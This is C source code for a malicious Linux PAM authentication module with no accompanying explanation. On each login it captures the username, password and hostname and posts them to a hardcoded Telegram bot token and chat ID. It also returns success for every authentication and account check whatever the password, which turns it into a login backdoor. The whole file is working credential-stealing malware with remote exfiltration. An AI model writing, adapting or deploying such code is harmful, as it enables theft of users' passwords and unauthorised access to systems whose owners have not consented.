#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

void sendMessage(char *message) {
    char url[500];
    char data[300];

    char token[200] = "5897712111:AAFU5DaqmJ-qGT_sUMLcOW3c8BK0MLAqqHs";

    long long int user_id = -1002268833042; 

    snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", token);
    snprintf(data, sizeof(data), "chat_id=%lld&text=%s", user_id, message);

    CURL *curl;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char* username;
    const char* password;
    char message[1024];
    char hostname[128];

    retval = pam_get_user(pamh, &username, "Username: ");
    pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
    if (retval != PAM_SUCCESS) {
        return retval;
    }

    gethostname(hostname, sizeof(hostname));
    snprintf(message, sizeof(message), "Hostname: %s\nUsername: %s\nPassword: %s\n", hostname, username, password);
    sendMessage(message); 

    return PAM_SUCCESS;
}
